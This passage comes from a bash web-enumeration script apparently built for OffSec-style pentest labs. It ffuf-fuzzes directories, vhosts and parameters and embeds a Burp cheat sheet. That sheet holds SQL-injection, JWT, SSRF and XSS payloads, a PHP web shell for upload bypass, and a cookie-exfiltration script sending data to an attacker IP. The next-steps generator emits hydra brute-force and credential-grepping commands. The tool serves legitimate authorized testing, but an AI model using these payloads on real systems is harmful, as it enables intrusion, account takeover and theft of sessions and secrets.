    Login SQLi:    admin' OR 1=1-- -    admin'/*
    JWT attacks:   JWT Editor > alg:none (re-sign with empty key)
                   Weak HMAC secret: hashcat -m 16500 jwt.txt rockyou.txt
                   kid path traversal: kid:"../../../../dev/null"
    Cookie tamper: user_id=1 -> 0, role=user -> admin, isAdmin=false -> true
    Header tricks: X-Forwarded-For: 127.0.0.1
                   X-Original-URL: /admin          X-Rewrite-URL: /admin
                   X-Remote-User: admin            X-Remote-Addr: 127.0.0.1

  File upload bypass:
    Content-Type override: send PHP body with Content-Type: image/jpeg
    Double extension:      shell.php.jpg   shell.php.png   shell.php%00.jpg
    Alt PHP exts:          shell.phtml  shell.phar  shell.php5  shell.php7
    Case variants:         shell.PhP    shell.pHp
    Magic-byte prefix:     prepend GIF89a; then <?php system(\$_GET['c']); ?>
    After upload find with: ffuf -u $url/uploads/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt

  SSRF (url, redirect, callback, webhook, image_url params):
    http://127.0.0.1:22     http://127.0.0.1:80/    http://localhost/admin
    Cloud metadata:         http://169.254.169.254/latest/meta-data/
    Filter bypasses:        http://[::]:80         http://0.0.0.0
                            http://127.0.0.1.nip.io
                            http://localhost.@evil.com
                            http://2130706433        (decimal for 127.0.0.1)

  IDOR:
    Change any id/user/order/doc/file param up or down by 1.
    Use Intruder > Sniper with payload: Numbers 1-1000 step 1.
    Status 200 carrying another user's data = IDOR confirmed.

  XSS (comment, search, display params):
    "><script>alert(1)</script>     '><img src=x onerror=alert(1)>
    Event handlers to try: onerror onload onfocus onmouseover
    For reflected-only targets: ignore (not OffSec scorable).
    For stored XSS with admin viewing: swap alert to cookie exfil
      <script>new Image().src='http://$KALI_IP/?c='+document.cookie</script>

[5] INTRUDER WORKFLOWS
  Username enumeration (find valid users by response length):
    POST /login  body: username=§FUZZ§&password=x
    wordlist:  /usr/share/seclists/Usernames/Names/names.txt
    wordlist:  /usr/share/seclists/Usernames/top-usernames-shortlist.txt
    Look at the Length column; group by size, pick the outliers.

  Password spray (never brute one user from scratch):
    POST /login  body: username=admin&password=§FUZZ§
    wordlist:  /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
    If lockout protection exists, use Turbo Intruder with 3/min pacing.

  Parameter mining (find hidden params):
    GET /?§FUZZ§=test   or Param Miner extension on the request
    wordlist:  /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
    Grep Extract on response to detect reflected value -> likely live param.

  Cluster Bomb (user × pass combined wordlists):
    Two payload positions.  Use for "spray small lists of common creds".

[6] DIFFING  (Comparer + Decoder)
    Comparer: anon-response vs auth-response (right-click > Send to Comparer).
    Decoder:  base64 cookies, URL-encoded params, JWT payload inspection.

[7] EVIDENCE
    Right-click request > Save item    -> $outdir/evidence/<vuln>_<time>.req
    File > Save project as             -> $outdir/burp_project.burp
BURP
    } > "$outdir/burp_workflow.txt"

    _prune_useless_files "$outdir"
    progress_log "$2" "DONE" "$phase_name" ""
    success "Fingerprinting complete"
}

#==============================================================================
# PHASE 2 — DIRECTORY & FILE FUZZING
#==============================================================================
phase_content() {
    local url="$1"
    local outdir="$2/content"

    local phase_name="content"
    if is_phase_done "$2" "$phase_name"; then
        info "Content fuzzing already done — skipping"
        return 0
    fi
    if ! check_tool ffuf; then
        warn "ffuf not found — skipping content fuzzing (install: sudo apt install ffuf)"
        progress_log "$2" "FAIL" "$phase_name" "ffuf not found"
        return 1
    fi
    mkdir -p "$outdir"
    progress_log "$2" "START" "$phase_name" "url=$url"
    phase "Phase 2 — Directory & File Fuzzing: $url"

    # Detect tech stack for extension selection
    local tech=""
    tech=$(detect_tech "$2/fingerprint/whatweb.txt")
    local extensions=""
    extensions=$(get_extensions "$tech")
    info "  Detected tech hint: $tech → extensions: $extensions"

    # Determine SSL flag
    local proto=""
    proto=$(get_proto "$url")
    local -a ssl_flag=()
    [[ "$proto" == "https" ]] && ssl_flag=(-k)

    # Build base ffuf flags. -ac is opt-in because it can over-filter odd apps,
    # but it is useful on wildcard-heavy hosts after reviewing baselines.
    # NOTE: -v (verbose) intentionally omitted — floods output and breaks grep pipe.
    # shellcheck disable=SC2054  # commas in -mc value are ffuf syntax, not array separators
    local base_flags=(-t "$THREADS" -timeout "$FFUF_TIMEOUT" \
        -mc 200,201,204,301,302,307,401,403,405 \
        -c -noninteractive "${ssl_flag[@]}")
    [[ "$FFUF_RATE" -gt 0 ]] && base_flags+=(-rate "$FFUF_RATE")
    [[ "$FFUF_AUTOCALIBRATE" == "true" ]] && base_flags+=(-ac)

    local baseline_path=""
    baseline_path="/$(tr -dc '[:lower:]' </dev/urandom | head -c12)"
    {
        echo "# ffuf baseline probe"
        echo "url=${url%/}${baseline_path}"
        timeout "$CURL_TIMEOUT" curl -sk -o /dev/null \
            -w "status=%{http_code} size=%{size_download} words=%{num_headers} time=%{time_total}\n" \
            "${url%/}${baseline_path}" 2>/dev/null || true
        echo "autocalibrate=${FFUF_AUTOCALIBRATE}"
    } > "$outdir/ffuf_baseline.txt"

    local phase_ok=true

    # --- 2a: Directory fuzzing with raft-medium ---
    local wl_dir=""
    wl_dir=$(check_wordlist "$WL_DIR_MEDIUM" "$WL_DIR_DIRBUSTER" "$WL_DIR_FAST") || true
    if [[ -n "$wl_dir" ]]; then
        _tool_start "ffuf dirs" "${url%/}/FUZZ" "${PHASE_CONTENT_TIMEOUT}s  wl: $(basename "$wl_dir")"
        local _ffuf_d_t0
        _ffuf_d_t0=$(date +%s)
        timeout "$PHASE_CONTENT_TIMEOUT" ffuf \
            "${base_flags[@]}" \
            -w "${wl_dir}:FUZZ" \
            -u "${url%/}/FUZZ" \
            -o "$outdir/dirs_medium.json" -of json \
            > "$outdir/dirs_medium_console.txt" 2>&1 || phase_ok=false
        _tool_done "ffuf dirs" "$_ffuf_d_t0"

        # Also save human-readable version
        ffuf_json_to_text "$outdir/dirs_medium.json" > "$outdir/dirs_medium.txt" 2>/dev/null || true
        # Drop rows matching the wildcard baseline (size=0 nginx catch-all etc.)
        _drop_wildcard_ffuf_rows "$outdir/dirs_medium.txt" "$outdir/ffuf_baseline.txt"
    fi

    # --- 2b: File fuzzing with extensions ---
    local wl_files=""
    wl_files=$(check_wordlist "$WL_FILES_MEDIUM" "$WL_DIR_MEDIUM" "$WL_DIR_FAST") || true
    if [[ -n "$wl_files" ]]; then
        _tool_start "ffuf files" "${url%/}/FUZZ" "${PHASE_CONTENT_TIMEOUT}s  ext: $extensions"
        local _ffuf_f_t0
        _ffuf_f_t0=$(date +%s)
        timeout "$PHASE_CONTENT_TIMEOUT" ffuf \
            "${base_flags[@]}" \
            -w "${wl_files}:FUZZ" \
            -u "${url%/}/FUZZ" \
            -e ".${extensions//,/,.}" \
            -o "$outdir/files_medium.json" -of json \
            > "$outdir/files_medium_console.txt" 2>&1 || phase_ok=false
        _tool_done "ffuf files" "$_ffuf_f_t0"

        ffuf_json_to_text "$outdir/files_medium.json" > "$outdir/files_medium.txt" 2>/dev/null || true
        _drop_wildcard_ffuf_rows "$outdir/files_medium.txt" "$outdir/ffuf_baseline.txt"
    fi

    # --- 2c: If raft-large exists AND we're in deep mode, run it too ---
    if [[ "$DEEP_MODE" == "true" ]] && [[ -f "$WL_DIR_LARGE" ]]; then
        info "  → ffuf deep directory fuzzing (raft-large — this is slow)"
        timeout "$PHASE_CONTENT_TIMEOUT" ffuf \
            "${base_flags[@]}" \
            -w "${WL_DIR_LARGE}:FUZZ" \
            -u "${url%/}/FUZZ" \
            -o "$outdir/dirs_large.json" -of json \
            > "$outdir/dirs_large_console.txt" 2>&1 || phase_ok=false

        ffuf_json_to_text "$outdir/dirs_large.json" > "$outdir/dirs_large.txt" 2>/dev/null || true
        _drop_wildcard_ffuf_rows "$outdir/dirs_large.txt" "$outdir/ffuf_baseline.txt"
    fi

    _prune_useless_files "$outdir"
    if [[ "$phase_ok" == "true" ]]; then
        progress_log "$2" "DONE" "$phase_name" "tech=$tech"
    else
        progress_log "$2" "FAIL" "$phase_name" "tech=$tech"
    fi
    success "Content fuzzing complete"
}

#==============================================================================
# PHASE 3 — RECURSIVE FUZZING (deep mode only)
#==============================================================================
phase_recursive() {
    local url="$1"
    local outdir="$2/content/recursive"

    if [[ "$DEEP_MODE" != "true" ]]; then
        info "Skipping recursive fuzzing (use --deep to enable)"
        return 0
    fi

    local phase_name="recursive"
    if is_phase_done "$2" "$phase_name"; then
        info "Recursive fuzzing already done — skipping"
        return 0
    fi
    mkdir -p "$outdir"
    progress_log "$2" "START" "$phase_name" "url=$url"
    phase "Phase 3 — Recursive Fuzzing (deep mode): $url"

    if ! check_tool ffuf; then
        warn "ffuf not found — skipping"
        return 1
    fi

    # Find interesting directories from phase 2 to recurse into
    local interesting_dirs=()
    local path_part=""

    # Extract URLs directly from ffuf JSON (reliable) for 200/301/302 results
    if [[ -f "$2/content/dirs_medium.json" ]]; then
        while IFS= read -r dir_url; do
            [[ -z "$dir_url" ]] && continue
            # Skip root URL itself
            # shellcheck disable=SC2001  # regex replacement not expressible as param expansion
            path_part=$(echo "$dir_url" | sed 's|https\?://[^/]*||')
            [[ "$path_part" == "/" || -z "$path_part" ]] && continue
            interesting_dirs+=("$dir_url")
        done < <(python3 << PYEOF
import json, sys
try:
    with open('$2/content/dirs_medium.json') as f:
        data = json.load(f)
    for r in data.get('results', []):
        status = r.get('status', 0)
        if status in (200, 301, 302):
            print(r.get('url', ''))
except Exception as e:
    print(f'webenum: JSON parse error (dirs_medium): {e}', file=sys.stderr)
PYEOF
        )
    fi

    if (( ${#interesting_dirs[@]} == 0 )); then
        info "No interesting directories found to recurse into"
        progress_log "$2" "DONE" "$phase_name" "no-dirs"
        return 0
    fi

    # Cap at 20 to avoid spending the whole engagement recursing
    if (( ${#interesting_dirs[@]} > 20 )); then
        warn "  Too many dirs (${#interesting_dirs[@]}) — capping at 20"
        interesting_dirs=("${interesting_dirs[@]:0:20}")
    fi

    info "  Found ${#interesting_dirs[@]} directory/ies to recurse into"

    local wl_dir=""
    wl_dir=$(check_wordlist "$WL_DIR_MEDIUM" "$WL_DIR_FAST") || return 1

    local proto=""
    proto=$(get_proto "$url")
    local -a ssl_flag=()
    [[ "$proto" == "https" ]] && ssl_flag=(-k)

    local tech=""
    tech=$(detect_tech "$2/fingerprint/whatweb.txt")
    local extensions=""
    extensions=$(get_extensions "$tech")

    local phase_ok=true
    local safe_name=""
    local i=0
    for dir_url in "${interesting_dirs[@]}"; do
        (( i++ ))
        safe_name=$(echo "$dir_url" | sed 's|https\?://||;s|[/:]|_|g')
        info "  → recursing into: $dir_url ($i/${#interesting_dirs[@]})"

        # shellcheck disable=SC2054  # commas in -mc value are ffuf syntax, not array separators
        timeout "$PHASE_RECURSIVE_TIMEOUT" ffuf \
            -t "$THREADS" -timeout "$FFUF_TIMEOUT" \
            -mc 200,201,204,301,302,307,401,403 \
            -c -noninteractive "${ssl_flag[@]}" \
            -w "${wl_dir}:FUZZ" \
            -u "${dir_url%/}/FUZZ" \
            -e ".${extensions//,/,.}" \
            -o "$outdir/${safe_name}.json" -of json \
            > "$outdir/${safe_name}_console.txt" 2>&1 || phase_ok=false

        ffuf_json_to_text "$outdir/${safe_name}.json" > "$outdir/${safe_name}.txt" 2>/dev/null || true
    done

    _prune_useless_files "$outdir"
    if [[ "$phase_ok" == "true" ]]; then
        progress_log "$2" "DONE" "$phase_name" "dirs=${#interesting_dirs[@]}"
    else
        progress_log "$2" "FAIL" "$phase_name" "dirs=${#interesting_dirs[@]}"
    fi
    success "Recursive fuzzing complete"
}

#==============================================================================
# PHASE 4 — VHOST FUZZING
#==============================================================================
phase_vhosts() {
    local url="$1"
    local outdir="$2/vhosts"

    if [[ -z "$VHOST_DOMAIN" ]]; then
        info "Skipping vhost fuzzing (use --vhost <domain> to enable)"
        return 0
    fi

    local phase_name="vhosts"
    if is_phase_done "$2" "$phase_name"; then
        info "Vhost fuzzing already done — skipping"
        return 0
    fi
    mkdir -p "$outdir"
    progress_log "$2" "START" "$phase_name" "domain=$VHOST_DOMAIN"
    phase "Phase 4 — VHost Fuzzing: *.${VHOST_DOMAIN}"

    if ! check_tool ffuf; then
        warn "ffuf not found — skipping"
        return 1
    fi

    local wl=""
    wl=$(check_wordlist "$WL_VHOSTS" "/usr/share/wordlists/dirb/common.txt") || return 1

    local proto=""
    proto=$(get_proto "$url")
    local -a ssl_flag=()
    [[ "$proto" == "https" ]] && ssl_flag=(-k)

    # Step 1: Get baseline response size to filter on
    info "  → getting baseline response size for filtering"
    local baseline_size=""
    baseline_size=$(timeout "$CURL_TIMEOUT" curl -sk -o /dev/null -w "%{size_download}" \
        -H "Host: nonexistent12345.${VHOST_DOMAIN}" \
        -A "Mozilla/5.0" "$url" 2>/dev/null || echo "")
    if [[ -z "$baseline_size" || "$baseline_size" == "0" ]]; then
        warn "  Baseline size is 0 or empty — vhost filtering may be unreliable"
        warn "  If all vhosts are filtered out, re-run without -fs or check target manually"
    fi
    info "  Baseline size: ${baseline_size:-0} bytes (will filter this out)"

    # Step 2: Vhost fuzz with size filter
    local phase_ok=true
    local -a fs_flag=()
    if [[ -n "$baseline_size" && "$baseline_size" != "0" ]]; then
        fs_flag=(-fs "$baseline_size")
    fi
    _tool_start "ffuf vhosts" "Host: FUZZ.${VHOST_DOMAIN}" "${PHASE_VHOST_TIMEOUT}s"
    local _ffuf_vh_t0
    _ffuf_vh_t0=$(date +%s)
    # shellcheck disable=SC2054  # commas in -mc value are ffuf syntax, not array separators
    timeout "$PHASE_VHOST_TIMEOUT" ffuf \
        -t "$THREADS" -timeout "$FFUF_TIMEOUT" \
        -mc 200,201,204,301,302,307,401,403 \
        "${fs_flag[@]}" \
        -c -noninteractive "${ssl_flag[@]}" \
        -w "${wl}:FUZZ" \
        -u "$url" \
        -H "Host: FUZZ.${VHOST_DOMAIN}" \
        -o "$outdir/vhosts.json" -of json \
        > "$outdir/vhosts_console.txt" 2>&1 || phase_ok=false
    _tool_done "ffuf vhosts" "$_ffuf_vh_t0"

    ffuf_json_to_text "$outdir/vhosts.json" > "$outdir/vhosts.txt" 2>/dev/null || true

    # Report discovered vhosts for /etc/hosts
    # Use ffuf_json_fuzz_words to extract the FUZZ input (vhost name), not the URL
    local found_vhosts=""
    found_vhosts=$(ffuf_json_fuzz_words "$outdir/vhosts.json" 2>/dev/null)
    local found_count=""
    found_count=$(echo "$found_vhosts" | grep -c '.' 2>/dev/null); found_count=${found_count:-0}

    if (( found_count > 0 )); then
        local ip=""
        ip=$(get_host "$url")
        echo ""
        success "  ★ Found ${found_count} vhost(s) — add to /etc/hosts:"
        echo "$found_vhosts" | while read -r vhost; do
            [[ -z "$vhost" ]] && continue
            echo "  ${ip}  ${vhost}.${VHOST_DOMAIN}"
        done | tee "$outdir/hosts_entries.txt"
    fi

    _prune_useless_files "$outdir"
    if [[ "$phase_ok" == "true" ]]; then
        progress_log "$2" "DONE" "$phase_name" "found=$found_count"
    else
        progress_log "$2" "FAIL" "$phase_name" "found=$found_count"
    fi
    success "VHost fuzzing complete"
}

#==============================================================================
# PHASE 5 — PARAMETER DISCOVERY (deep mode only)
#==============================================================================
phase_params() {
    local url="$1"
    local outdir="$2/params"

    if [[ "$DEEP_MODE" != "true" ]]; then
        info "Skipping parameter discovery (use --deep to enable)"
        return 0
    fi

    local phase_name="params"
    if is_phase_done "$2" "$phase_name"; then
        info "Parameter discovery already done — skipping"
        return 0
    fi
    mkdir -p "$outdir"
    progress_log "$2" "START" "$phase_name" "url=$url"
    phase "Phase 5 — Parameter Discovery (deep mode)"

    if ! check_tool ffuf; then
        warn "ffuf not found — skipping"
        return 1
    fi

    if [[ ! -f "$WL_PARAMS" ]]; then
        warn "Parameter wordlist not found: $WL_PARAMS — skipping"
        progress_log "$2" "SKIP" "$phase_name" "no wordlist"
        return 0
    fi

    local proto=""
    proto=$(get_proto "$url")
    local -a ssl_flag=()
    [[ "$proto" == "https" ]] && ssl_flag=(-k)

    # Collect interesting endpoints from content phase to fuzz params on
    local endpoints=("${url%/}/")
    if [[ -f "$2/content/dirs_medium.json" ]]; then
        while IFS= read -r ep_url; do
            [[ -z "$ep_url" ]] && continue
            endpoints+=("$ep_url")
        done < <(python3 << PYEOF
import json, sys
try:
    with open('$2/content/dirs_medium.json') as f:
        data = json.load(f)
    for r in data.get('results', []):
        if r.get('status') == 200:
            print(r.get('url', ''))
except Exception as e:
    print(f'webenum: JSON parse error (dirs_medium params): {e}', file=sys.stderr)
PYEOF
        )
    fi
    # Also pull from files scan
    if [[ -f "$2/content/files_medium.json" ]]; then
        while IFS= read -r ep_url; do
            [[ -z "$ep_url" ]] && continue
            endpoints+=("$ep_url")
        done < <(python3 << PYEOF
import json, sys
try:
    with open('$2/content/files_medium.json') as f:
        data = json.load(f)
    for r in data.get('results', []):
        if r.get('status') == 200:
            url = r.get('url', '')
            # Only fuzz endpoints that look like scripts/pages, not static files
            if any(url.endswith(ext) for ext in ('.php','.asp','.aspx','.jsp','.do','.action','.cgi','.pl')):
                print(url)
except Exception as e:
    print(f'webenum: JSON parse error (files_medium): {e}', file=sys.stderr)
PYEOF
        )
    fi
    # Deduplicate and cap
    mapfile -t endpoints < <(printf '%s\n' "${endpoints[@]}" | sort -u | head -15)

    info "  Fuzzing GET parameters on ${#endpoints[@]} endpoint(s)"

    local phase_ok=true
    local safe_name=""
    local baseline=""
    local i=0
    for endpoint in "${endpoints[@]}"; do
        (( i++ ))
        safe_name=$(echo "$endpoint" | sed 's|https\?://||;s|[/:]|_|g')

        # Get baseline to filter on
        baseline=$(timeout "$CURL_TIMEOUT" curl -sk -o /dev/null -w "%{size_download}" \
            -A "Mozilla/5.0" "${endpoint}?nonexistent12345=test" 2>/dev/null || echo "")

        local -a param_fs_flag=()
        if [[ -n "$baseline" && "$baseline" != "0" ]]; then
            param_fs_flag=(-fs "$baseline")
        fi

        info "  → param fuzzing: $endpoint ($i/${#endpoints[@]})"
        # shellcheck disable=SC2054  # -mc all is not comma-separated — no SC2054 here anyway
        timeout "$PHASE_PARAM_TIMEOUT" ffuf \
            -t "$THREADS" -timeout "$FFUF_TIMEOUT" \
            -mc all "${param_fs_flag[@]}" \
            -c -noninteractive "${ssl_flag[@]}" \
            -w "${WL_PARAMS}:FUZZ" \
            -u "${endpoint}?FUZZ=testvalue" \
            -o "$outdir/params_${safe_name}.json" -of json \
            > "$outdir/params_${safe_name}_console.txt" 2>&1 || phase_ok=false

        ffuf_json_to_text "$outdir/params_${safe_name}.json" \
            > "$outdir/params_${safe_name}.txt" 2>/dev/null || true
    done

    _prune_useless_files "$outdir"
    if [[ "$phase_ok" == "true" ]]; then
        progress_log "$2" "DONE" "$phase_name" "endpoints=${#endpoints[@]}"
    else
        progress_log "$2" "FAIL" "$phase_name" "endpoints=${#endpoints[@]}"
    fi
    success "Parameter discovery complete"
}

#==============================================================================
# JSON → TEXT HELPER (parse ffuf JSON output to human-readable table)
#==============================================================================
ffuf_json_to_text() {
    local json_file="$1"
    [[ ! -f "$json_file" ]] && return 1

    python3 << PYEOF
import json, sys
try:
    with open('${json_file}') as f:
        data = json.load(f)
    results = data.get('results', [])
    if not results:
        print('No results.')
        sys.exit(0)
    # Check if any result has an input/FUZZ field (vhost mode)
    has_input = any(r.get('input', {}).get('FUZZ') for r in results)
    if has_input:
        hdr = f"{'FUZZ':<30} {'URL':<40} | {'Status':>6} | {'Size':>8} | {'Words':>6} | {'Lines':>5}"
        print(hdr)
        print('-' * len(hdr))
        for r in sorted(results, key=lambda x: (x.get('status',0), x.get('input',{}).get('FUZZ',''))):
            fuzz = r.get('input', {}).get('FUZZ', '')
            print(f"{fuzz:<30} {r.get('url',''):<40} | {r.get('status',0):>6} | {r.get('length',0):>8} | {r.get('words',0):>6} | {r.get('lines',0):>5}")
    else:
        hdr = f"{'URL':<60} | {'Status':>6} | {'Size':>8} | {'Words':>6} | {'Lines':>5}"
        print(hdr)
        print('-' * len(hdr))
        for r in sorted(results, key=lambda x: (x.get('status',0), x.get('url',''))):
            print(f"{r.get('url',''):<60} | {r.get('status',0):>6} | {r.get('length',0):>8} | {r.get('words',0):>6} | {r.get('lines',0):>5}")
except Exception as e:
    print(f'Parse error: {e}')
PYEOF
}

# Extract just the FUZZ words from ffuf JSON (for vhost names, etc.)
ffuf_json_fuzz_words() {
    local json_file="$1"
    [[ ! -f "$json_file" ]] && return 1

    python3 << PYEOF
import json, sys
try:
    with open('${json_file}') as f:
        data = json.load(f)
    for r in data.get('results', []):
        fuzz = r.get('input', {}).get('FUZZ', '')
        if fuzz:
            print(fuzz)
except Exception as e:
    print(f'webenum: JSON parse error (fuzz_words): {e}', file=sys.stderr)
PYEOF
}

# Extract URLs from ffuf JSON (for recursive/param endpoint discovery)
ffuf_json_urls() {
    local json_file="$1"
    [[ ! -f "$json_file" ]] && return 1

    python3 << PYEOF
import json, sys
try:
    with open('${json_file}') as f:
        data = json.load(f)
    for r in data.get('results', []):
        url = r.get('url', '')
        if url:
            print(url)
except Exception as e:
    print(f'webenum: JSON parse error (urls): {e}', file=sys.stderr)
PYEOF
}

#==============================================================================
# FINDING-DRIVEN NEXT STEPS
#==============================================================================
generate_next_steps() {
    local url="$1"
    local work_dir="$2"
    local next_file="$work_dir/loot/next_steps.txt"
    local HOST_SAFE
    HOST_SAFE=$(get_host "$url" | tr '.:' '_')
    mkdir -p "$work_dir/loot"

    {
        echo "# Finding-Driven Web Next Steps — $url"
        echo "# Generated: $(date)"
        echo "# Commands below are emitted only from concrete webenum findings."
        echo ""
    } > "$next_file"

    if is_nonempty_file "$work_dir/fingerprint/http_methods.txt" && \
       grep -qiE 'Allow:.*(TRACE|PUT|DELETE|CONNECT|PROPFIND)|Public:.*(TRACE|PUT|DELETE|CONNECT|PROPFIND)' "$work_dir/fingerprint/http_methods.txt" 2>/dev/null; then
        append_next_finding "$next_file" \
            "Risky HTTP method found" \
            "$work_dir/fingerprint/http_methods.txt contains risky method in Allow/Public header" \
            "curl -skIX OPTIONS ${url%/}/" \
            "nmap --script http-methods -p $(get_port "$url") $(get_host "$url")" \
            "curl -skI -X TRACE ${url%/}/ 2>/dev/null | sed -n '1,20p'"
    fi

    if is_nonempty_file "$work_dir/fingerprint/http_methods.txt" && \
       grep -qiE 'PUT|PROPFIND|MOVE|COPY|MKCOL' "$work_dir/fingerprint/http_methods.txt" 2>/dev/null; then
        append_next_finding "$next_file" \
            "WebDAV or upload-capable methods found" \
            "$work_dir/fingerprint/http_methods.txt contains PUT/PROPFIND/WebDAV-style methods" \
            "curl -skIX OPTIONS ${url%/}/" \
            "davtest -url ${url%/}/" \
            "cadaver ${url%/}/" \
            "printf 'webdav-test' > /tmp/webdav_test.txt && curl -sk -T /tmp/webdav_test.txt ${url%/}/webdav_test.txt && curl -sk ${url%/}/webdav_test.txt"
    fi

    local disallow_paths
    disallow_paths=$(grep -i 'Disallow:' "$work_dir/fingerprint/robots.txt" 2>/dev/null \
        | grep -oP 'Disallow:\s*\K\S+' | grep -v '^\*$' | head -3)
    if [[ -n "$disallow_paths" ]]; then
        local robot_cmds=()
        while IFS= read -r rpath; do
            [[ -z "$rpath" ]] && continue
            robot_cmds+=("curl -sk -o /dev/null -w '%{http_code} ${url%/}${rpath}\\n' '${url%/}${rpath}'")
        done <<< "$disallow_paths"
        append_next_finding "$next_file" \
            "robots.txt disallowed paths found" \
            "$work_dir/fingerprint/robots.txt contains Disallow entries" \
            "${robot_cmds[@]}"
    fi

    if is_nonempty_file "$work_dir/fingerprint/tls_names.txt"; then
        local tls_name
        tls_name=$(head -1 "$work_dir/fingerprint/tls_names.txt" 2>/dev/null)
        if [[ -n "$tls_name" ]]; then
            append_next_finding "$next_file" \
                "TLS certificate hostname found" \
                "$work_dir/fingerprint/tls_names.txt contains ${tls_name}" \
                "cat $work_dir/fingerprint/tls_names.txt" \
                "echo '$(get_host "$url") $tls_name' | sudo tee -a /etc/hosts" \
                "./webenum.sh --url $(get_proto "$url")://${tls_name}:$(get_port "$url")" \
                "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u ${url%/}/ -H 'Host: FUZZ.${tls_name#*.}' -mc 200,301,302,401,403"
        fi
    fi

    if is_nonempty_file "$work_dir/fingerprint/js_endpoints.txt"; then
        append_next_finding "$next_file" \
            "JavaScript endpoints found" \
            "$work_dir/fingerprint/js_endpoints.txt is non-empty" \
            "cat $work_dir/fingerprint/js_urls.txt" \
            "cat $work_dir/fingerprint/js_endpoints.txt" \
            "grep -E '/api|/admin|/login|/upload|token|debug' $work_dir/fingerprint/js_endpoints.txt"
    fi

    if is_nonempty_file "$work_dir/fingerprint/js_secret_hints.txt"; then
        append_next_finding "$next_file" \
            "JavaScript secret-looking strings found" \
            "$work_dir/fingerprint/js_secret_hints.txt contains credential keywords" \
            "cat $work_dir/fingerprint/js_secret_hints.txt" \
            "grep -RniE 'api[_-]?key|token|secret|password|authorization|bearer' $work_dir/fingerprint/js/"
    fi

    local auth_hits
    auth_hits=$(grep -h '| 401 |' "$work_dir/content/"*.txt "$work_dir/content/recursive/"*.txt 2>/dev/null | head -3)
    if [[ -n "$auth_hits" ]]; then
        local auth_cmds=()
        while IFS= read -r auth_line; do
            local auth_url auth_path
            auth_url=$(echo "$auth_line" | awk '{print $1}')
            auth_path="${auth_url#"${url%/}"}"
            [[ "$auth_path" == "$auth_url" || -z "$auth_path" ]] && auth_path="/"
            auth_cmds+=("hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/fasttrack.txt ${url%/} http-get ${auth_path}")
        done <<< "$auth_hits"
        append_next_finding "$next_file" \
            "HTTP auth required path found" \
            "ffuf output contains 401 responses" \
            "${auth_cmds[@]}"
    fi

    local login_hits
    login_hits=$(grep -hiE '/(login|signin|auth|wp-login|admin).*(\| 200 \||\] http)' "$work_dir/content/"*.txt "$work_dir/fingerprint/sensitive_paths.txt" 2>/dev/null | head -3)
    if [[ -n "$login_hits" ]]; then
        append_next_finding "$next_file" \
            "Login page discovered" \
            "content/sensitive path output contains login/admin 200 response" \
            "curl -sk ${url%/}/login | sed -n '1,80p'" \
            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/fasttrack.txt ${url%/} http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid'" \
            "ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u '${url%/}/login?FUZZ=test' -mc all -fs 0"
    fi

    if grep -qiE '<form[^>]+method=["'\'']?post|type=["'\'']?password|name=["'\'']?(user(name)?|login|email|pass(word)?)' \
       "$work_dir/fingerprint/homepage_source.html" "$work_dir/content/"*.txt "$work_dir/fingerprint/sensitive_paths.txt" 2>/dev/null; then
        append_next_finding "$next_file" \
            "HTTP POST login form evidence found" \
            "source/content output contains POST form, password field, or auth-style input names" \
            "curl -sk ${url%/}/login -o /tmp/${HOST_SAFE:-web}_login.html" \
            "grep -oiE '<form[^>]+|name=[\"'\"'\"'][^\"'\"'\"']+|type=[\"'\"'\"'][^\"'\"'\"']+' /tmp/${HOST_SAFE:-web}_login.html | head -40" \
            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/fasttrack.txt ${url%/} http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid'"
    fi

    local sensitive_hits
    sensitive_hits=$(grep -hiE '\.(bak|sql|env|config|conf|xml|json|zip|tar|gz|old|backup|log).*\| 200 \|' "$work_dir/content/"*.txt 2>/dev/null | awk '{print $1}' | head -5)
    if [[ -n "$sensitive_hits" ]]; then
        local sens_cmds=()
        while IFS= read -r found_url; do
            [[ -z "$found_url" ]] && continue
            sens_cmds+=("curl -sk '${found_url}' -o /tmp/loot_$(basename "${found_url%%\?*}") && grep -iE 'pass|secret|key|token|user|db_' /tmp/loot_$(basename "${found_url%%\?*}")")
        done <<< "$sensitive_hits"
        append_next_finding "$next_file" \
            "Sensitive file discovered" \
            "content ffuf output contains sensitive extension with HTTP 200" \
            "${sens_cmds[@]}"
    fi

    if grep -qiE '/\.env.*(\| 200 \||HTTP/[0-9.]+ 200)|APP_KEY=|DB_PASSWORD=|Laravel' "$work_dir/fingerprint/sensitive_paths.txt" "$work_dir/content/"*.txt "$work_dir/fingerprint/homepage_source.html" 2>/dev/null; then
        append_next_finding "$next_file" \
            "Laravel/.env indicators found" \
            "sensitive path/source/content output matched .env, APP_KEY, DB_PASSWORD, or Laravel" \
            "curl -sk ${url%/}/.env | tee /tmp/${HOST_SAFE:-web}_env.txt" \
            "grep -iE 'APP_KEY|DB_|MAIL_|REDIS_|PASSWORD|SECRET' /tmp/${HOST_SAFE:-web}_env.txt" \
            "searchsploit laravel"
    fi

    # Why: bare "debugger"/"Traceback" keywords match legitimate JS and body text.
    # Require the Werkzeug X-Powered-By header or a live traceback page.
    if grep -qiE '^X-Powered-By:[[:space:]]*Werkzeug' "$work_dir/fingerprint/headers.txt" 2>/dev/null \
        || _confirm_fingerprint "$url" "/?__debugger__=yes" 'Werkzeug|__debugger__' \
        || _confirm_fingerprint "$url" "/debug/" 'Werkzeug|Traceback \(most recent call last\)'; then
        append_next_finding "$next_file" \
            "Debug framework indicators found" \
            "Werkzeug header present OR live debugger/traceback page confirmed" \
            "curl -sk ${url%/}/?__debugger__=yes | sed -n '1,80p'" \
            "curl -sk ${url%/}/debug | sed -n '1,80p'" \
            "searchsploit werkzeug django debug"
    fi

    if grep -qiE 'Index of /|Directory listing for|Parent Directory' "$work_dir/fingerprint/homepage_source.html" "$work_dir/content/"*.txt 2>/dev/null; then
        append_next_finding "$next_file" \
            "Directory listing found" \
            "source/content output matched directory listing markers" \
            "curl -sk ${url%/}/ | sed -n '1,120p'" \
